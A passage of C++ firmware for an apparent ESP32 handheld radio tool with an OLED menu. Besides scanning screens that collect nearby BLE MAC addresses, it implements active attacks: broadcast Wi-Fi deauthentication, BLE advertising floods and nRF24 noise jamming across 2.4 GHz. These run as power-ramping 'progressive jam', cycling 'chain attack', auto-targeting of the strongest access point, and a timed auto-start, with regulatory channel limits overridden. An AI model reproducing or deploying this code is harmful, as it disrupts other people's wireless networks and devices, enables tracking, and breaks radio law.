  if (now - gGeofenceLastScan >= 5000) {
    gGeofenceLastScan = now;
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(20);
    { wifi_country_t cty={"XX",1,14,78,WIFI_COUNTRY_POLICY_MANUAL}; esp_wifi_set_country(&cty); }
    WiFi.scanNetworks(true, true);
  }
  int n = WiFi.scanComplete();
  if (n >= 0) {
    gGeofenceFound = false;
    for (int i = 0; i < n; i++) {
      if (strcmp(WiFi.SSID(i).c_str(), gGeofenceSsid) == 0) { gGeofenceFound = true; break; }
    }
    WiFi.scanDelete();
  }
  ggOled.clearDisplay(); ggHeader("GEOFENCE");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  char gs[22]; snprintf(gs,22,"\"%.18s\"",gGeofenceSsid);
  ggOled.setCursor(2,18); ggOled.print(gs);
  ggOled.setCursor(2,28);
  if (gGeofenceFound) {
    ggOled.setTextSize(2); ggOled.print("FOUND!"); ggOled.setTextSize(1);
    { static uint32_t gGeoBeepLast=0; uint32_t _n=millis(); if(_n-gGeoBeepLast>2000){ ggBeep(2500,60); ggBeep(3000,90); gGeoBeepLast=_n; } }
  } else {
    ggOled.setTextSize(2); ggOled.print("scanning"); ggOled.setTextSize(1);
  }
  ggOled.setCursor(2,45); ggOled.printf("CH%u  every 5s", gGeofenceCh);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- MAC HARVEST
static inline void ggScreenMacHarvest() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggBlePickScanBegin();
    gRunInit = true;
  }
  if (gEv.back) { ggBlePickScanEnd(); ggBack(); return; }
  if (ggBlePickScanPoll()) ggBlePickScanRestart();
  int n = ggMacCount;
  if (n > 0) ggMove(0, n-1);
  ggOled.clearDisplay(); ggHeader("MAC HARVEST");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("Unique MACs: %d", n);
  if (n > 0) {
    int top = 0;
    if (gSel > top + 2) top = gSel - 2;
    for (int i = 0; i < 3 && top + i < n; i++) {
      int idx = top + i;
      int y = 28 + i * 9;
      if (idx == gSel) {
        ggOled.fillRect(0, y-1, 128, 9, SSD1306_WHITE);
        ggOled.setTextColor(SSD1306_BLACK);
      } else ggOled.setTextColor(SSD1306_WHITE);
      ggOled.setCursor(2, y);
      ggOled.printf("%02X:%02X:%02X %ddB",
        ggMacList[idx][0],ggMacList[idx][1],ggMacList[idx][2],ggMacRssi[idx]);
    }
    ggOled.setTextColor(SSD1306_WHITE);
  } else {
    ggOled.setCursor(2, 35); ggOled.print("Scanning BLE...");
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- BLE PROXIMITY ALERT
static int8_t gProxThreshold = -40;
static bool   gProxAlerted = false;
static inline void ggScreenProxAlert() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    gProxAlerted = false;
    ggBlePickScanBegin();
    gRunInit = true;
  }
  if (gEv.back) { ggBlePickScanEnd(); ggBack(); return; }
  if (gEv.up)   { int v=gProxThreshold+5; if(v>-10)v=-10; gProxThreshold=(int8_t)v; }
  if (gEv.down) { int v=gProxThreshold-5; if(v<-90)v=-90; gProxThreshold=(int8_t)v; }
  if (ggBlePickScanPoll()) ggBlePickScanRestart();
  int8_t strongest = -127;
  int bestIdx = -1;
  for (int i = 0; i < ggBlePickDevCount; i++) {
    if (ggBlePickDevs[i].rssi > strongest) { strongest = ggBlePickDevs[i].rssi; bestIdx = i; }
  }
  bool alert = (strongest >= gProxThreshold && bestIdx >= 0);
  if (alert && !gProxAlerted) { ggBeep(2800,80); ggBeep(3200,120); gProxAlerted = true; }
  if (!alert) gProxAlerted = false;
  ggOled.clearDisplay(); ggHeader("PROX ALERT");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("Thresh: %ddBm  N:%d", gProxThreshold, ggBlePickDevCount);
  if (bestIdx >= 0) {
    ggOled.setCursor(2,28);
    if (alert) {
      ggOled.setTextSize(2); ggOled.print("CLOSE!"); ggOled.setTextSize(1);
    } else {
      ggOled.print("Nearest:");
    }
    ggOled.setCursor(2,45); ggOled.printf("%.12s %ddB", ggBlePickDevs[bestIdx].name, strongest);
  } else {
    ggOled.setCursor(2,35); ggOled.print("Scanning BLE...");
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK  UP/DN thresh");
  ggOled.display();
}

// ---------------------------------------------------------------- UUID SCANNER
static inline void ggScreenUuidScan() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggBlePickScanBegin();
    gRunInit = true;
  }
  if (gEv.back) { ggBlePickScanEnd(); ggBack(); return; }
  if (ggBlePickScanPoll()) ggBlePickScanRestart();
  int n = ggBlePickDevCount;
  if (n > 0) ggMove(0, n-1);
  ggOled.clearDisplay(); ggHeader("UUID SCAN");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("Devices: %d", n);
  if (n > 0) {
    int top = 0;
    if (gSel > top + 2) top = gSel - 2;
    for (int i = 0; i < 3 && top + i < n; i++) {
      int idx = top + i;
      int y = 28 + i * 9;
      if (idx == gSel) {
        ggOled.fillRect(0, y-1, 128, 9, SSD1306_WHITE);
        ggOled.setTextColor(SSD1306_BLACK);
      } else ggOled.setTextColor(SSD1306_WHITE);
      ggOled.setCursor(2, y);
      if (ggBlePickDevs[idx].uuid16)
        ggOled.printf("%.7s %04X", ggBlePickDevs[idx].name, ggBlePickDevs[idx].uuid16);
      else
        ggOled.printf("%.12s", ggBlePickDevs[idx].name);
    }
    ggOled.setTextColor(SSD1306_WHITE);
  } else {
    ggOled.setCursor(2, 35); ggOled.print("Scanning BLE...");
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- BLE RANGE TEST
static inline void ggScreenBleRange() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggBlePickScanBegin();
    gRunInit = true;
  }
  if (gEv.back) { ggBlePickScanEnd(); ggBack(); return; }
  if (ggBlePickScanPoll()) ggBlePickScanRestart();
  int8_t strongest = -127;
  int bestIdx = -1;
  for (int i = 0; i < ggBlePickDevCount; i++) {
    if (ggBlePickDevs[i].rssi > strongest) { strongest = ggBlePickDevs[i].rssi; bestIdx = i; }
  }
  ggOled.clearDisplay(); ggHeader("BLE RANGE");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  if (bestIdx >= 0) {
    ggOled.setCursor(2,18); ggOled.printf("%.10s N:%d", ggBlePickDevs[bestIdx].name, ggBlePickDevCount);
    ggOled.setTextSize(2); ggOled.setCursor(2,28); ggOled.printf("%ddBm", strongest); ggOled.setTextSize(1);
    int barW = (strongest + 100);
    if (barW < 0) barW = 0; if (barW > 100) barW = 100;
    ggOled.fillRect(2, 44, barW, 6, SSD1306_WHITE);
    ggOled.drawRect(2, 44, 100, 6, SSD1306_WHITE);
  } else {
    ggOled.setCursor(2,28); ggOled.print("Scanning BLE...");
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- PROGRESSIVE JAM
static uint32_t gProgStartMs = 0;
static inline void ggScreenProgJam() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gProgPwr = 0;
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_LOW;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gProgWifiUp = true;
    gBleTx.pps = 500; gBleTx.power = GG_BP_LOW; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gProgBleUp = true;
    ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
    ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
    if (ggNrfPresentA) { ggNrfNoiseBegin(0,0);  ggNrfSetPower(0,RF24_PA_MIN); }
    if (ggNrfPresentB) { ggNrfNoiseBegin(1,63); ggNrfSetPower(1,RF24_PA_MIN); }
    ggFloodNrfActive = true;
    gProgStartMs = millis(); gProgLastRamp = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gProgWifiUp) { ggWifiTxEnd(); gProgWifiUp = false; }
    if (gProgBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gProgBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  ggFloodNrfPump();
  if (ggBleFloodMode) ggBleFloodCycle();
  uint32_t now = millis();
  if (now - gProgLastRamp >= 5000 && gProgPwr < 3) {
    gProgLastRamp = now;
    gProgPwr++;
    int8_t txp;
    switch (gProgPwr) {
      case 1: txp = 44; break;
      case 2: txp = 68; break;
      default: txp = 78; break;
    }
    esp_wifi_set_max_tx_power(txp);
    esp_power_level_t bpwr;
    switch (gProgPwr) {
      case 1: bpwr = ESP_PWR_LVL_N0; break;
      case 2: bpwr = ESP_PWR_LVL_P6; break;
      default: bpwr = ESP_PWR_LVL_P9; break;
    }
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, bpwr);
    uint8_t nrfPa;
    switch (gProgPwr) {
      case 1: nrfPa = RF24_PA_LOW;  break;
      case 2: nrfPa = RF24_PA_HIGH; break;
      default: nrfPa = RF24_PA_MAX; break;
    }
    if (ggNrfPresentA) ggNrfSetPower(0,nrfPa);
    if (ggNrfPresentB) ggNrfSetPower(1,nrfPa);
  }
  static uint32_t lastProgHop = 0;
  if (now - lastProgHop >= 60) {
    lastProgHop = now;
    static uint8_t progCh = 1;
    progCh++; if (progCh > 14) progCh = 1;
    gWifiTx.channel = progCh;
    ggWifiTxSetChannel(progCh, gWifiTx);
  }
  uint32_t elapsed = (millis()-gProgStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("PROG JAM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("PWR %s", GG_WP_NAME[gProgPwr]);
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0; ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s %lus",wf,bf,(unsigned long)elapsed); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  ramps up");
  ggOled.display();
}

// ---------------------------------------------------------------- CHAIN ATTACK (WiFi>BLE>nRF cycle)
static uint32_t gChainStartMs = 0;
static inline void ggScreenChainRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gChainPhase = 0;
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gChainWifiUp = true; gChainBleUp = false;
    gChainPhaseMs = millis();
    gChainStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gChainWifiUp) { ggWifiTxEnd(); gChainWifiUp = false; }
    if (gChainBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gChainBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  uint32_t now = millis();
  if (now - gChainPhaseMs >= 10000) {
    gChainPhaseMs = now;
    gChainPhase = (gChainPhase + 1) % 3;
    if (gChainPhase == 0) {
      ggFloodNrfStop();
      gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
      memset(ggWifiDeauthBssid, 0xFF, 6);
      ggWifiDeauthMode = true;
      ggWifiTxBegin(gWifiTx);
      gChainWifiUp = true;
    } else if (gChainPhase == 1) {
      if (gChainWifiUp) { ggWifiTxEnd(); gChainWifiUp = false; }
      ggWifiDeauthMode = false;
      gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
      ggBleFloodMode = true;
      ggBleTxBegin(gBleTx);
      gChainBleUp = true;
    } else {
      if (gChainBleUp) { ggBleFloodMode = false; ggBleTxEnd(); gChainBleUp = false; }
      ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
      ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
      if (ggNrfPresentA) ggNrfNoiseBegin(0,0);
      if (ggNrfPresentB) ggNrfNoiseBegin(1,63);
      ggFloodNrfActive = true;
    }
  }
  if (gChainPhase == 1 && ggBleFloodMode) ggBleFloodCycle();
  if (gChainPhase == 2) ggFloodNrfPump();
  if (gChainPhase == 0) {
    static uint32_t lastChHop = 0;
    if (now - lastChHop >= 60) { lastChHop = now; static uint8_t chC=1; chC++; if(chC>14)chC=1; gWifiTx.channel=chC; ggWifiTxSetChannel(chC, gWifiTx); }
  }
  uint32_t elapsed = (millis()-gChainStartMs)/1000;
  uint32_t elPh = (now - gChainPhaseMs)/1000;
  uint32_t left = (elPh < 10) ? (10 - elPh) : 0;
  const char* ph[] = {"WiFi","BLE","nRF"};
  ggOled.clearDisplay(); ggHeader("CHAIN ATK");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("Phase: %s  %lus",ph[gChainPhase],(unsigned long)left);
  ggOled.setTextSize(2); ggOled.setCursor(2,28); ggOled.print(ph[gChainPhase]); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("Total: %lus  MAX PWR",(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  auto-cycle");
  ggOled.display();
}

// ---------------------------------------------------------------- AUTO-TARGET
static uint32_t gAutoStartMs = 0;
static bool     gAutoWifiUp = false, gAutoBleUp = false;
static bool     gAutoScanning = true;
static inline void ggScreenAutoTarget() {
  if (!gRunInit) {
    gAutoScanning = true;
    ggWifiPickScanBegin();
    gRunInit = true;
  }
  if (gAutoScanning) {
    if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
    if (!ggWifiPickScanPoll()) {
      ggOled.clearDisplay(); ggHeader("AUTO TARGET");
      ggOled.setTextColor(SSD1306_WHITE);
      ggOled.setCursor(2,25); ggOled.print("Scanning for target");
      ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
      ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
      ggOled.display(); return;
    }
    if (ggWifiAPCount == 0) {
      ggOled.clearDisplay(); ggHeader("AUTO TARGET");
      ggOled.setTextColor(SSD1306_WHITE);
      ggOled.setCursor(2,25); ggOled.print("No networks found");
      ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
      ggOled.setCursor(2,56); ggOled.print("BACK=go back");
      ggOled.display(); return;
    }
    int best = 0;
    for (int i = 1; i < ggWifiAPCount; i++)
      if (ggWifiAPs[i].rssi > ggWifiAPs[best].rssi) best = i;
    gJamCh = ggWifiAPs[best].channel;
    memcpy(ggWifiDeauthBssid, ggWifiAPs[best].bssid, 6);
    ggWifiPickScanEnd();
    ggClickFire();
    gAutoScanning = false;
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gWifiTx.channel = gJamCh; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gAutoWifiUp = true;
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gAutoBleUp = true;
    ggFloodNrfStart(gJamCh);
    gAutoStartMs = millis(); gPhase = 0;
    return;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gAutoWifiUp) { ggWifiTxEnd(); gAutoWifiUp = false; }
    if (gAutoBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gAutoBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  if (ggBleFloodMode) ggBleFloodCycle();
  ggFloodNrfPump();
  static uint32_t lastAutoHop = 0;
  uint32_t now = millis();
  if (now - lastAutoHop >= 60) {
    lastAutoHop = now;
    static uint8_t autoCh = 1;
    autoCh++; if (autoCh > 14) autoCh = 1;
    gWifiTx.channel = autoCh;
    ggWifiTxSetChannel(autoCh, gWifiTx);
  }
  uint32_t elapsed = (millis()-gAutoStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("AUTO TARGET");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u STRONGEST", gJamCh);
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0; ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s %lus",wf,bf,(unsigned long)elapsed); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- WIFI HEATMAP
static bool gHeatDone = false;
static inline void ggScreenHeatmap() {
  if (!gRunInit) { memset(gHeatData, 0, sizeof(gHeatData)); gHeatCh = 0; gHeatDone = false; ggWifiPickScanBegin(); gRunInit = true; }
  if (gEv.back) { if (!gHeatDone) ggWifiPickScanEnd(); ggBack(); return; }
  if (!gHeatDone && ggWifiPickScanPoll()) {
    for (int i = 0; i < ggWifiAPCount; i++) {
      uint8_t ch = ggWifiAPs[i].channel;
      if (ch >= 1 && ch <= 14) gHeatData[ch-1]++;
    }
    ggWifiPickScanEnd();
    gHeatDone = true;
  }
  if (gEv.sel) { memset(gHeatData, 0, sizeof(gHeatData)); gHeatDone = false; ggWifiPickScanBegin(); }
  ggOled.clearDisplay(); ggHeader("HEATMAP");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  for (int c = 0; c < 14; c++) {
    int x = 2 + c * 9;
    int h = gHeatData[c] * 4;
    if (h > 28) h = 28;
    if (h > 0) ggOled.fillRect(x, 44 - h, 7, h, SSD1306_WHITE);
    ggOled.setCursor(x, 46);
    if (c < 9) ggOled.printf("%d", c+1);
    else { char n[3]; snprintf(n,3,"%d",c+1); ggOled.print(n); }
  }
  ggOled.drawFastHLine(0,44,128,SSD1306_WHITE);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("SEL=rescan  BACK");
  ggOled.display();
}

// ---------------------------------------------------------------- BAND OCCUPANCY (nRF spectrum)
static inline void ggScreenBandOcc() {
  if (!gRunInit) { memset(gNrfScan,0,sizeof(gNrfScan)); gScanPause=false; if(ggNrfToolP()) ggNrfScanStart(); gRunInit=true; }
  if (gEv.back) { ggNrfStopAll(); ggBack(); return; }
  if (gEv.sel) { gScanPause=!gScanPause; if(!gScanPause && ggNrfToolP()) ggNrfScanStart(); else if(gScanPause) ggNrfStopAll(); }
  ggOled.clearDisplay(); ggHeader("BAND OCC");
  for (int c = 0; c <= 125; c++) {
    int h = gNrfScan[c];
    if (h > 30) h = 30;
    if (h > 0) ggOled.drawFastVLine(c + 1, 44 - h, h, SSD1306_WHITE);
  }
  ggOled.drawFastHLine(0,44,128,SSD1306_WHITE);
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,46); ggOled.print("2400-----2483 MHz");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print(gScanPause?"SEL=run  BACK":"SEL=pause  BACK");
  ggOled.display();
}

// ---------------------------------------------------------------- PACKET RATE GRAPH
static inline void ggScreenPktRate() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    gPktRateCnt = 0; gPktRatePerSec = 0; gPktRateOn = false;
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
    { wifi_country_t cty={"XX",1,14,78,WIFI_COUNTRY_POLICY_MANUAL}; esp_wifi_set_country(&cty); }
    esp_wifi_set_promiscuous_rx_cb(ggPktRateSniffCb);
    esp_wifi_set_promiscuous(true);
    gPktRateOn = true;
    gPktRateLastMs = millis();
    gRunInit = true;
  }
  if (gEv.back) {
    if (gPktRateOn) { esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_OFF); gPktRateOn = false; }
    ggBack(); return;
  }
  if (gEv.sel) { gPktRateCnt = 0; gPktRatePerSec = 0; }
  uint32_t now = millis();
  if (now - gPktRateLastMs >= 1000) {
    gPktRatePerSec = (uint16_t)(gPktRateCnt * 1000 / (now - gPktRateLastMs));
    gPktRateCnt = 0;
    gPktRateLastMs = now;
  }
  ggOled.clearDisplay(); ggHeader("PKT RATE");
  ggOled.setTextColor(SSD1306_WHITE);
  ggOled.setTextSize(2); ggOled.setCursor(2,20); ggOled.printf("%u", gPktRatePerSec); ggOled.setTextSize(1);
  ggOled.setCursor(80,24); ggOled.print("pkt/s");
  int barW = gPktRatePerSec / 10;
  if (barW > 120) barW = 120;
  ggOled.fillRect(2, 40, barW, 8, SSD1306_WHITE);
  ggOled.drawRect(2, 40, 120, 8, SSD1306_WHITE);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  SEL=reset");
  ggOled.display();
}

// ---------------------------------------------------------------- ATTACK TIMER
static const char* const ATK_TYPES[] = { "Ch Thief", "Beacon Spam", "BLE Spam" };
static inline void ggScreenAtkTimer() {
  if (!gAtkTimerArmed) {
    if (gEv.back) { ggBack(); return; }
    if (gEv.up) {
      if (gEditing) { int v=(int)gAtkTimerSec+10; if(v>300)v=300; gAtkTimerSec=(uint16_t)v; }
      else ggStepU8(gSel, -1, 0, 2);
    }
    if (gEv.down) {
      if (gEditing) { int v=(int)gAtkTimerSec-10; if(v<10)v=10; gAtkTimerSec=(uint16_t)v; }
      else ggStepU8(gSel, +1, 0, 2);
    }
    if (gEv.sel) {
      if (gSel == 0) { gAtkTimerType = (gAtkTimerType + 1) % 3; }
      else if (gSel == 1) { gEditing = !gEditing; }
      else { gAtkTimerArmed = true; gAtkTimerStart = millis(); ggClickFire(); }
    }
    ggOled.clearDisplay(); ggHeader("ATK TIMER");
    ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
    static char r0[22], r1[22], r2[22];
    snprintf(r0,22,"Attack: %s", ATK_TYPES[gAtkTimerType]);
    snprintf(r1,22,"Delay: %u sec", gAtkTimerSec);
    snprintf(r2,22,"ARM >");
    const char* p[] = {r0, r1, r2};
    const char* hints[] = {"SEL=cycle type","UP/DN delay  SEL ok","SEL=start countdown"};
    ggMenu("ATK TIMER", p, 3, gSel, gTop, gEditing?"UP/DN change  SEL ok":hints[gSel]);
  } else {
    uint32_t elapsed = (millis()-gAtkTimerStart)/1000;
    if (elapsed >= gAtkTimerSec) {
      gAtkTimerArmed = false;
      switch (gAtkTimerType) {
        case 0: gJamCh = 1; ggBack(); ggGo(GS_JAM_RUN); break;
        case 1: ggBack(); ggGo(GS_SPAM_RUN); break;
        case 2: ggBleSpamProto = GG_BSP_APPLE; ggBack(); ggGo(GS_BLESPAM_RUN); break;
      }
      return;
    }
    if (gEv.back) { gAtkTimerArmed = false; ggBack(); return; }
    uint32_t left = gAtkTimerSec - elapsed;
    ggOled.clearDisplay(); ggHeader("ATK TIMER");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,18); ggOled.printf("Attack: %s", ATK_TYPES[gAtkTimerType]);
    ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.printf("%lus",(unsigned long)left); ggOled.setTextSize(1);
    ggOled.setCursor(2,45); ggOled.print("Auto-starts when 0");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=disarm");
    ggOled.display();
  }
}

// ---------------------------------------------------------------- BYTE / TEXT editor
//  UP/DOWN change the highlighted byte. Tap SELECT = next byte (wraps). On the
//  PAYLOAD editor (gBLenPtr set) HOLD SELECT = add a byte on the end, so growing
//  a payload is one gesture. BACK keeps everything you typed (saved in place).
static inline void ggScreenBytes() {
  if (gBAscii) {   // text: scroll printable chars only (easy typing)
    if (gEv.up)   gBBuf[gBIdx] = (gBBuf[gBIdx] >= 32 && gBBuf[gBIdx] < 126) ? gBBuf[gBIdx]+1 : 32;
    if (gEv.down) gBBuf[gBIdx] = (gBBuf[gBIdx] > 32  && gBBuf[gBIdx] <= 126) ? gBBuf[gBIdx]-1 : 126;
  } else {
    if (gEv.up)   gBBuf[gBIdx]++;
    if (gEv.down) gBBuf[gBIdx]--;
  }
  if (gEv.right) { gBIdx = (gBIdx + 1) % (gBN ? gBN : 1); }
  if (gEv.left)  { gBIdx = (gBIdx > 0) ? gBIdx - 1 : (gBN ? gBN - 1 : 0); }
  if (gEv.selLong && gBLenPtr && gBN < gBLenMax) {     // hold SELECT = add a byte
    gBN++; *gBLenPtr = gBN; gBBuf[gBN-1] = gBAscii ? ' ' : 0x00; gBIdx = gBN-1;
  } else if (gEv.sel) {
    gBIdx = (gBIdx + 1) % (gBN ? gBN : 1);             // tap = next byte
  }
  if (gEv.back){ ggBack(); return; }
  ggOled.clearDisplay(); ggHeader(gBTitle);
  // compact 8-wide grid: rows at y16/25/34/43 so a full 32 bytes clear the hint
  for(int i=0;i<gBN;i++){ int col=i%8,row=i/8,x=2+col*15,y=16+row*9;
    if(i==gBIdx){ ggOled.fillRect(x-1,y-1,15,9,SSD1306_WHITE); ggOled.setTextColor(SSD1306_BLACK);} else ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(x,y); ggOled.printf("%02X",gBBuf[i]); }
  int usedRows=(gBN+7)/8; int py=16+usedRows*9+1;      // just under the grid
  if (gBAscii && py<=45){ ggOled.setTextColor(SSD1306_WHITE); ggOled.setCursor(2,py); ggOled.print("\"");
    for(int i=0;i<gBN&&i<20;i++){ char c=gBBuf[i]; ggOled.write((c>=32&&c<127)?c:'.'); } ggOled.print("\""); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE); ggOled.setCursor(2,56);
  ggOled.print(gBLenPtr ? "L/R move  hold5=+byte" : (gBAscii?"UP/DN char  L/R move":"UP/DN val  L/R move"));
  ggOled.display();
}

// ---------------------------------------------------------------- MY PAYLOADS (library)
static inline void ggPayPreview(uint8_t i, char* out, size_t n) {
  if (!ggPaySlotUsed(i)) { snprintf(out,n,"%u  (empty)", i+1); return; }
  GgPayload p; if (!ggPayLoad(i,p)) { snprintf(out,n,"%u  (error)", i+1); return; }
  if (p.len<1||p.len>GG_PAYLOAD_MAX) p.len=1;
  if (p.kind==GG_PL_TEXT) {
    char t[13]; uint8_t m=p.len>12?12:p.len, j=0;
    for (; j<m; j++){ char c=p.bytes[j]; t[j]=(c>=32&&c<127)?c:'.'; } t[j]=0;
    snprintf(out,n,"%u \"%s\"", i+1, t);
  } else {
    snprintf(out,n,"%u %02X%02X..(%uB)", i+1, p.bytes[0], p.len>1?p.bytes[1]:0, p.len);
  }
}
static inline void ggScreenPayLib() {
  if (gEv.up)   ggStepU8(gPaySlot,-1,0,GG_PAYLIB_SLOTS-1);
  if (gEv.down) ggStepU8(gPaySlot,+1,0,GG_PAYLIB_SLOTS-1);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel){ gSel=0; ggGo(GS_PAYACT); return; }
  static char rows[GG_PAYLIB_SLOTS][22]; const char* p[GG_PAYLIB_SLOTS];
  for(int i=0;i<GG_PAYLIB_SLOTS;i++){ ggPayPreview(i,rows[i],22); p[i]=rows[i]; }
  int top=gPaySlot<4?0:gPaySlot-3;
  ggMenu("My payloads", p, GG_PAYLIB_SLOTS, gPaySlot, top, "SEL=open  BACK");
}
static const char* const PAY_USED[]  = { "Load & send >", "Load only", "Overwrite", "Delete" };
static const char* const PAY_EMPTY[] = { "Save current here" };
// Apply a saved entry - bytes AND its send settings - onto a radio profile.
static inline void ggPayApply(const GgPayload& p, GgNrfProfile& dst){
